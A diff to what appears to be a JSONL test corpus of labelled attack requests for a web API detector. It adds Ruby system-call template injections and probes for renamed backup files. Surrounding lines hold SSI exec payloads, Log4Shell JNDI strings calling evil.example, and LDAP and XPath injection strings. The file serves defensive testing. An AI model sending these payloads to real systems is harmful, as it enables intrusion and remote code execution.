@@ -135,6 +135,9 @@
 {"name":"ssi exec with backtick","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"<!--#exec cmd=\\\"ls `id`\\\" -->\"}"}
 {"name":"ssi config errmsg","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<!--#config errmsg=\"x\" -->"]],"headers":{},"content_type":"","body":""}
 {"name":"ssi set variable","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<!--#set var=\"a\" value=\"b\" -->"]],"headers":{},"content_type":"","body":""}
+{"name":"ruby call around nested data path","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","#{system(\"id #{a.b}\")}"]],"headers":{},"content_type":"","body":""}
+{"name":"ruby call around nested number","category":"ssti","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"note\":\"#{system(\\\"id #{1}\\\")}\"}"}
+{"name":"jinja safe filter in a conditional","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ x|safe if a else b }}"]],"headers":{},"content_type":"","body":""}
 {"name":"jndi in user-agent","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"content_type":"","body":""}
 {"name":"obfuscated jndi","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"X-Api-Version":"${${lower:j}ndi:${lower:l}dap://evil.example/a}"},"content_type":"","body":""}
 {"name":"jndi in query","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${jndi:rmi://evil.example/x}"]],"headers":{},"content_type":"","body":""}
@@ -209,6 +212,8 @@
 {"name":"jorgee","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"Mozilla/5.0 Jorgee"},"content_type":"","body":""}
 {"name":"zmeu","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"ZmEu"},"content_type":"","body":""}
 {"name":"paros","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"Paros/3.2.13"},"content_type":"","body":""}
+{"name":"sql dump renamed as a module","category":"scanner","kind":"attack","method":"GET","path":"/x.sql.mjs.gz","query":[],"headers":{},"content_type":"","body":""}
+{"name":"tar archive renamed as a feed","category":"scanner","kind":"attack","method":"GET","path":"/backup.tar.rss.gz","query":[],"headers":{},"content_type":"","body":""}
 {"name":"session fixation","category":"session","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","PHPSESSID=attacker-fixed-id"]],"headers":{},"content_type":"","body":""}
 {"name":"ldap injection","category":"misc","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","*)(uid=*))(|(uid=*"]],"headers":{},"content_type":"","body":""}
 {"name":"xpath injection","category":"misc","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","' or name()='username' or 'x'='y"]],"headers":{},"content_type":"","body":""}
